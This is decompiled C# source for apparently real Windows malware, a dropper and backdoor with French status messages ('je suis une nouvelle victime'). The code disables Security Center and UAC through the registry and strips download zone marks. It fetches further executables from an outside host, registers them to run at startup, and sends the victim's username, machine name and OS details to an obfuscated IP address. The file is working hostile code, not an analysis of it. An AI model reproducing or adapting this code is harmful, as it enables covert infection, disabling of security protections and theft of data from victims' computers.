using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

public class ActiveX
{
	private static string string_0;

	private static string string_1 = null;

	private static string string_2 = "bGFiYXN0";

	private static bool bool_0 = true;

	[STAThread]
	public static void Main()
	{
		UTF8Encoding uTF8Encoding = new UTF8Encoding();
		string s = "V2" + ((ServerComputer)MyProject.MyComputer_0).get_Name() + ((ServerComputer)MyProject.MyComputer_0).get_Info().get_OSFullName() + Conversions.ToString((double)((ServerComputer)MyProject.MyComputer_0).get_Info().get_TotalVirtualMemory() / 1024.0) + Conversions.ToString((double)((ServerComputer)MyProject.MyComputer_0).get_Info().get_TotalPhysicalMemory() / 1024.0) + string_2;
		byte[] bytes = uTF8Encoding.GetBytes(s);
		string_1 = Convert.ToBase64String(bytes);
		Mutex mutex = new Mutex(initiallyOwned: true, string_1);
		try
		{
			mutex.ReleaseMutex();
			mutex.WaitOne();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\updater.exe", false) == 0)
		{
			try
			{
				if (!File.Exists(Path.GetTempPath() + "\\tmp147852369.tmp"))
				{
					File.AppendAllText(Path.GetTempPath() + "\\tmp147852369.tmp", string_2);
				}
				else if (Operators.CompareString(string_2, File.ReadAllText(Path.GetTempPath() + "\\tmp147852369.tmp"), false) != 0)
				{
					FileSystem.Kill(Path.GetTempPath() + "\\tmp147852369.tmp");
					File.AppendAllText(Path.GetTempPath() + "\\tmp147852369.tmp", string_2);
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				string[] string_ = new string[4] { "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\wscsvc", "Start", "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA" };
				smethod_1(string_, Path.GetTempPath() + "\\agentsrv.exe", "agentsrv");
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			try
			{
				smethod_2();
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			try
			{
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
		}
		else
		{
			File.Move(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\updater.exe");
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\updater.exe");
			ProjectData.EndApp();
		}
		ProjectData.EndApp();
	}

	public static void smethod_0(string string_3, string string_4, bool bool_1)
	{
		try
		{
			string[] array = string_3.Split(new char[1] { '/' });
			string[] array2 = null;
			string[] array3 = array;
			foreach (string text in array3)
			{
				array2 = text.Split(new char[1] { '.' });
			}
			try
			{
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				array2[0] = "update";
				ProjectData.ClearProjectError();
			}
			if (File.Exists(string_4 + "\\tmp111.txt"))
			{
				FileSystem.Kill(string_4 + "\\tmp111.txt");
			}
			if (!File.Exists(string_4 + "\\" + array2[0] + ".exe"))
			{
				((ServerComputer)MyProject.MyComputer_0).get_Network().DownloadFile(string_3, string_4 + "\\tmp111.txt");
				File.Move(string_4 + "\\tmp111.txt", string_4 + "\\" + array2[0] + ".exe");
				if (bool_1)
				{
					Process.Start(string_4 + "\\" + array2[0] + ".exe");
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_1(string[] string_3, string string_4, string string_5)
	{
		checked
		{
			if (!((ServerComputer)MyProject.MyComputer_0).get_Info().get_OSFullName().Contains("XP"))
			{
				int num = 0;
				do
				{
					try
					{
						if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(((ServerComputer)MyProject.MyComputer_0).get_Registry().GetValue(string_3[0 + 2 * num], string_3[1 + 2 * num], (object)""), (object)(4 * (1 - num)), false))))
						{
							((ServerComputer)MyProject.MyComputer_0).get_Registry().SetValue(string_3[0 + 2 * num], string_3[1 + 2 * num], (object)(4 * (1 - num)));
						}
						if (num == 0)
						{
							string_0 += "\r\nBypass UAC - Etapes 1 : Succès";
						}
						else
						{
							string_0 += "\r\nBypass UAC - Etapes 2 : Succès";
						}
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						if (num == 0)
						{
							string_0 += "\r\nBypass UAC - Etapes 1 : Echec";
						}
						else
						{
							string_0 += "\r\nBypass UAC - Etapes 2 : Echec";
						}
						string_0 = string_0 + "\r\n" + ex2.Message;
						ProjectData.ClearProjectError();
					}
					num++;
				}
				while (num <= 1);
			}
			else
			{
				string_0 += "\r\nBypass UAC - Etapes 1 & 2 : Non nécessaire";
			}
			try
			{
				Process process = new Process();
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = "cmd";
				processStartInfo.RedirectStandardInput = true;
				processStartInfo.RedirectStandardOutput = true;
				processStartInfo.UseShellExecute = false;
				processStartInfo.CreateNoWindow = true;
				process.StartInfo = processStartInfo;
				process.Start();
				StreamReader standardOutput = process.StandardOutput;
				StreamWriter standardInput = process.StandardInput;
				standardInput.WriteLine("cd " + string_4);
				standardInput.WriteLine("FOR /R %I IN (*" + string_5 + "*) DO > %I:Zone.Identifier ECHO.");
				standardInput.WriteLine("exit");
				Console.WriteLine(standardOutput.ReadToEnd());
				standardInput.Close();
				standardOutput.Close();
				string_0 += "\r\nBypass UAC - Etapes 3 : Succès";
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				string_0 += "\r\nBypass UAC - Etapes 3 : Echec";
				string_0 = string_0 + "\r\n" + ex4.Message;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void smethod_2()
	{
		try
		{
			smethod_0("http://heavencorp.free.fr/dwn/V2/launcher.txt", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), bool_1: false);
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue("launcher", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\launcher.exe");
			string_0 += "\r\nStartUp 1 - Installation : Succès";
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			string_0 += "\r\nStartUp 1 - Echec de l'installation";
			string_0 = string_0 + "\r\n" + ex2.Message;
			ProjectData.ClearProjectError();
		}
		try
		{
			smethod_0("http://heavencorp.free.fr/dwn/V2/agentsrv.txt", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), bool_0);
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue("agentsrv", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\agentsrv.exe");
			string_0 += "\r\nStartUp 2 - Installation : Succès";
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			string_0 += "\r\nStartUp 2 - Echec de l'installation";
			string_0 = string_0 + "\r\n" + ex4.Message;
			ProjectData.ClearProjectError();
		}
		try
		{
			smethod_0("http://heavencorp.free.fr/dwn/V2/msca.txt", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), bool_0);
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue("msca", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\msca.exe");
			string_0 += "\r\nStartUp 3 - Installation : Succès";
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception ex6 = ex5;
			string_0 += "\r\nStartUp 3 - Echec de l'installation";
			string_0 = string_0 + "\r\n" + ex6.Message;
			ProjectData.ClearProjectError();
		}
		try
		{
			smethod_0("http://heavencorp.free.fr/dwn/V2/launcher.txt", Environment.GetFolderPath(Environment.SpecialFolder.Startup), bool_1: false);
			string_0 += "\r\nStartUp 4 - Installation : Succès";
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7);
			Exception ex8 = ex7;
			string_0 += "\r\nStartUp 4 - Echec de l'installation";
			string_0 = string_0 + "\r\n" + ex8.Message;
			ProjectData.ClearProjectError();
		}
		try
		{
			smethod_0("http://heavencorp.free.fr/dwn/V2/vsrss.txt", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), bool_1: false);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		smethod_3();
	}

	public static void smethod_3()
	{
		string text = null;
		try
		{
			text = "\r\nBonjour, je suis une nouvelle victime ! Mon nom est " + Environment.UserName + " et je suis sur le PC : " + ((ServerComputer)MyProject.MyComputer_0).get_Name() + ". Je me suis correctement lancé le " + Conversions.ToString(DateAndTime.get_Now()) + "\r\n\r\nDétails :\r\n\r\n-OS : " + ((ServerComputer)MyProject.MyComputer_0).get_Info().get_OSFullName() + "\r\n-RAM Total : " + Conversions.ToString(Conversion.Int((double)((ServerComputer)MyProject.MyComputer_0).get_Info().get_TotalPhysicalMemory() / 1232896.0)) + " mo\r\n-RAM Utilisé : " + Conversions.ToString(Conversion.Int((double)checked(((ServerComputer)MyProject.MyComputer_0).get_Info().get_TotalPhysicalMemory() - ((ServerComputer)MyProject.MyComputer_0).get_Info().get_AvailablePhysicalMemory()) / 1232896.0)) + " mo\r\n-Token : \r\n" + string_1 + "\r\n\r\n\r\nRésumé de l'installation :\r\n\r\n" + string_0 + "\r\n";
			byte[] bytes = Convert.FromBase64String("aHR0cDovLzk1LjIxMS4xODcuNS9teWxvZ3MucGhw");
			UTF8Encoding uTF8Encoding = new UTF8Encoding();
			string @string = uTF8Encoding.GetString(bytes);
			if (smethod_4(@string))
			{
				@string = @string + "?to=" + string_2 + "&name=" + ((ServerComputer)MyProject.MyComputer_0).get_Name() + "&os=" + ((ServerComputer)MyProject.MyComputer_0).get_Info().get_OSFullName() + "&username=" + Environment.UserName + "&token=" + string_1 + "&ng";
				if (File.Exists(Application.get_StartupPath() + "\\config12.ini"))
				{
					text = text + File.ReadAllText(Application.get_StartupPath() + "\\config12.ini") + "\r\n\r\nFIN logs OFFLINE - " + Conversions.ToString(DateAndTime.get_Now());
					FileSystem.Kill(Application.get_StartupPath() + "\\config12.ini");
				}
				try
				{
					WebRequest webRequest = WebRequest.Create(@string);
					webRequest.Method = "POST";
					UTF8Encoding uTF8Encoding2 = new UTF8Encoding();
					string s = text;
					byte[] bytes2 = uTF8Encoding.GetBytes(s);
					text = Convert.ToBase64String(bytes2);
					object obj = "logs=" + text + "&token=" + string_1;
					object[] array = new object[1] { RuntimeHelpers.GetObjectValue(obj) };
					bool[] array2 = new bool[1] { true };
					object obj2 = NewLateBinding.LateGet((object)uTF8Encoding2, (Type)null, "GetBytes", array, (string[])null, (Type[])null, array2);
					if (array2[0])
					{
						obj = RuntimeHelpers.GetObjectValue(array[0]);
					}
					byte[] array3 = (byte[])obj2;
					webRequest.ContentType = "application/x-www-form-urlencoded";
					webRequest.ContentLength = array3.Length;
					Stream requestStream = webRequest.GetRequestStream();
					requestStream.Write(array3, 0, array3.Length);
					requestStream.Close();
					WebResponse response = webRequest.GetResponse();
					requestStream = response.GetResponseStream();
					StreamReader streamReader = new StreamReader(requestStream);
					streamReader.ReadToEnd();
					streamReader.Close();
					requestStream.Close();
					response.Close();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				string_0 = null;
			}
			else if (File.Exists(Application.get_StartupPath() + "\\config12.ini"))
			{
				File.AppendAllText(Application.get_StartupPath() + "\\config12.ini", "\r\n" + text + "\r\n");
			}
			else
			{
				File.AppendAllText(Application.get_StartupPath() + "\\config12.ini", "\r\n\r\nDEBUT logs OFFLINE - " + Conversions.ToString(DateAndTime.get_Now()) + "\r\n\r\n" + text);
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static bool smethod_4(string string_3)
	{
		try
		{
			WebRequest webRequest = WebRequest.Create(string_3);
			webRequest.GetResponse();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		return true;
	}
}
